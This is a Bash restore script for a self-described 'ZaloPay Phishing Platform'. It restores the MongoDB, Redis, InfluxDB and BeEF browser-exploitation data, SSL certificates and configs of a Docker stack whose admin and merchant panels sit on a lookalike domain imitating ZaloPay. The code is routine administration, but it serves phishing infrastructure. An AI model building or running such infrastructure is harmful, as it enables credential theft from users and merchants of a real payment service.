#!/bin/bash

# Restore Script for ZaloPay Phishing Platform
# This script restores backups of databases, configurations, and logs

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
BACKUP_DIR="backups"
DOCKER_COMPOSE_FILE="docker-compose.yml"

# Functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

check_backup_exists() {
    local backup_name="$1"
    local backup_file="$BACKUP_DIR/${backup_name}.tar.gz"
    
    if [ ! -f "$backup_file" ]; then
        log_error "Backup file not found: $backup_file"
        log_info "Available backups:"
        ls -la "$BACKUP_DIR"/*.tar.gz 2>/dev/null || echo "No backups found"
        exit 1
    fi
    
    log_success "Backup file found: $backup_file"
}

extract_backup() {
    local backup_name="$1"
    local backup_file="$BACKUP_DIR/${backup_name}.tar.gz"
    
    log_info "Extracting backup..."
    
    # Create temporary directory
    local temp_dir="/tmp/restore_$backup_name"
    mkdir -p "$temp_dir"
    
    # Extract backup
    tar -xzf "$backup_file" -C "$temp_dir"
    
    log_success "Backup extracted to: $temp_dir"
    echo "$temp_dir"
}

stop_services() {
    log_info "Stopping services..."
    
    docker-compose -f $DOCKER_COMPOSE_FILE down
    
    log_success "Services stopped"
}

restore_mongodb() {
    local restore_dir="$1"
    
    log_info "Restoring MongoDB..."
    
    # Check if MongoDB backup exists
    if [ -d "$restore_dir/mongodb" ]; then
        # Start MongoDB service
        docker-compose -f $DOCKER_COMPOSE_FILE up -d mongodb
        
        # Wait for MongoDB to be ready
        sleep 10
        
        # Copy backup to container
        docker cp "$restore_dir/mongodb" $(docker-compose -f $DOCKER_COMPOSE_FILE ps -q mongodb):/tmp/restore
        
        # Restore database
        docker-compose -f $DOCKER_COMPOSE_FILE exec -T mongodb mongorestore \
            --db zalopay_phishing \
            --drop \
            /tmp/restore/zalopay_phishing
        
        log_success "MongoDB restored"
    else
        log_warning "MongoDB backup not found in restore directory"
    fi
}

restore_redis() {
    local restore_dir="$1"
    
    log_info "Restoring Redis..."
    
    # Check if Redis backup exists
    if [ -f "$restore_dir/redis/dump.rdb" ]; then
        # Start Redis service
        docker-compose -f $DOCKER_COMPOSE_FILE up -d redis
        
        # Wait for Redis to be ready
        sleep 5
        
        # Copy backup to container
        docker cp "$restore_dir/redis/dump.rdb" $(docker-compose -f $DOCKER_COMPOSE_FILE ps -q redis):/data/
        
        # Restart Redis to load backup
        docker-compose -f $DOCKER_COMPOSE_FILE restart redis
        
        log_success "Redis restored"
    else
        log_warning "Redis backup not found in restore directory"
    fi
}

restore_influxdb() {
    local restore_dir="$1"
    
    log_info "Restoring InfluxDB..."
    
    # Check if InfluxDB backup exists
    if [ -d "$restore_dir/influxdb" ]; then
        # Start InfluxDB service
        docker-compose -f $DOCKER_COMPOSE_FILE up -d influxdb
        
        # Wait for InfluxDB to be ready
        sleep 10
        
        # Copy backup to container
        docker cp "$restore_dir/influxdb" $(docker-compose -f $DOCKER_COMPOSE_FILE ps -q influxdb):/tmp/restore
        
        # Restore database
        docker-compose -f $DOCKER_COMPOSE_FILE exec -T influxdb influx restore /tmp/restore
        
        log_success "InfluxDB restored"
    else
        log_warning "InfluxDB backup not found in restore directory"
    fi
}

restore_configurations() {
    local restore_dir="$1"
    
    log_info "Restoring configurations..."
    
    # Restore environment file
    if [ -f "$restore_dir/.env" ]; then
        cp "$restore_dir/.env" .
        log_success "Environment file restored"
    fi
    
    # Restore docker-compose file
    if [ -f "$restore_dir/$DOCKER_COMPOSE_FILE" ]; then
        cp "$restore_dir/$DOCKER_COMPOSE_FILE" .
        log_success "Docker Compose file restored"
    fi
    
    # Restore SSL certificates
    if [ -d "$restore_dir/ssl" ]; then
        cp -r "$restore_dir/ssl" .
        log_success "SSL certificates restored"
    fi
    
    # Restore Nginx configuration
    if [ -d "$restore_dir/nginx" ]; then
        cp -r "$restore_dir/nginx" .
        log_success "Nginx configuration restored"
    fi
    
    # Restore scripts
    if [ -d "$restore_dir/scripts" ]; then
        cp -r "$restore_dir/scripts" .
        log_success "Scripts restored"
    fi
}

restore_logs() {
    local restore_dir="$1"
    
    log_info "Restoring logs..."
    
    if [ -d "$restore_dir/logs" ]; then
        cp -r "$restore_dir/logs" .
        log_success "Logs restored"
    else
        log_warning "Logs backup not found in restore directory"
    fi
}

restore_data() {
    local restore_dir="$1"
    
    log_info "Restoring data directories..."
    
    # Create data directory
    mkdir -p data
    
    # Restore MongoDB data
    if [ -d "$restore_dir/data/mongodb" ]; then
        cp -r "$restore_dir/data/mongodb" data/
        log_success "MongoDB data restored"
    fi
    
    # Restore Redis data
    if [ -d "$restore_dir/data/redis" ]; then
        cp -r "$restore_dir/data/redis" data/
        log_success "Redis data restored"
    fi
    
    # Restore InfluxDB data
    if [ -d "$restore_dir/data/influxdb" ]; then
        cp -r "$restore_dir/data/influxdb" data/
        log_success "InfluxDB data restored"
    fi
    
    # Restore BeEF data
    if [ -d "$restore_dir/data/beef" ]; then
        cp -r "$restore_dir/data/beef" data/
        log_success "BeEF data restored"
    fi
}

start_services() {
    log_info "Starting services..."
    
    docker-compose -f $DOCKER_COMPOSE_FILE up -d
    
    # Wait for services to be ready
    sleep 30
    
    log_success "Services started"
}

verify_restore() {
    log_info "Verifying restore..."
    
    # Check if services are running
    if docker-compose -f $DOCKER_COMPOSE_FILE ps | grep -q "Up"; then
        log_success "Services are running"
    else
        log_error "Some services are not running"
        return 1
    fi
    
    # Check MongoDB
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T mongodb mongosh --eval "db.runCommand('ping')" &> /dev/null; then
        log_success "MongoDB is accessible"
    else
        log_error "MongoDB is not accessible"
        return 1
    fi
    
    # Check Redis
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T redis redis-cli ping &> /dev/null; then
        log_success "Redis is accessible"
    else
        log_error "Redis is not accessible"
        return 1
    fi
    
    # Check InfluxDB
    if curl -s http://localhost:8086/health &> /dev/null; then
        log_success "InfluxDB is accessible"
    else
        log_error "InfluxDB is not accessible"
        return 1
    fi
    
    return 0
}

cleanup_temp() {
    local temp_dir="$1"
    
    log_info "Cleaning up temporary files..."
    
    rm -rf "$temp_dir"
    
    log_success "Temporary files cleaned up"
}

show_restore_info() {
    local backup_name="$1"
    
    log_info "Restore Information:"
    echo "===================="
    echo "Backup Name: $backup_name"
    echo "Restore Date: $(date)"
    echo ""
    echo "Services Status:"
    docker-compose -f $DOCKER_COMPOSE_FILE ps
    echo ""
    echo "To verify the restore:"
    echo "1. Check service logs: docker-compose logs -f"
    echo "2. Run health check: ./scripts/health_check.sh"
    echo "3. Test admin dashboard: https://zalopaymerchan.com/admin"
    echo "4. Test merchant interface: https://zalopaymerchan.com/merchant"
}

# Main restore function
restore() {
    local backup_name="$1"
    
    if [ -z "$backup_name" ]; then
        log_error "Backup name is required"
        log_info "Usage: $0 <backup_name>"
        log_info "Available backups:"
        ls -la "$BACKUP_DIR"/*.tar.gz 2>/dev/null || echo "No backups found"
        exit 1
    fi
    
    log_info "Starting restore process..."
    echo "=================================="
    
    check_backup_exists "$backup_name"
    local restore_dir=$(extract_backup "$backup_name")
    
    stop_services
    restore_mongodb "$restore_dir"
    restore_redis "$restore_dir"
    restore_influxdb "$restore_dir"
    restore_configurations "$restore_dir"
    restore_logs "$restore_dir"
    restore_data "$restore_dir"
    start_services
    
    if verify_restore; then
        show_restore_info "$backup_name"
        log_success "Restore completed successfully!"
    else
        log_error "Restore verification failed!"
        exit 1
    fi
    
    cleanup_temp "$restore_dir"
    echo "=================================="
}

# Handle command line arguments
case "${1:-restore}" in
    "restore")
        restore "$2"
        ;;
    "list")
        log_info "Available backups:"
        ls -la "$BACKUP_DIR"/*.tar.gz 2>/dev/null || echo "No backups found"
        ;;
    "verify")
        if [ -z "$2" ]; then
            log_error "Backup name is required for verification"
            exit 1
        fi
        check_backup_exists "$2"
        log_success "Backup verification completed"
        ;;
    *)
        echo "Usage: $0 {restore|list|verify} [backup_name]"
        echo ""
        echo "Commands:"
        echo "  restore <backup_name> - Restore from backup"
        echo "  list                 - List available backups"
        echo "  verify <backup_name> - Verify backup file"
        echo ""
        echo "Examples:"
        echo "  $0 restore zalopay_phishing_backup_20231201_120000"
        echo "  $0 list"
        echo "  $0 verify zalopay_phishing_backup_20231201_120000"
        exit 1
        ;;
esac
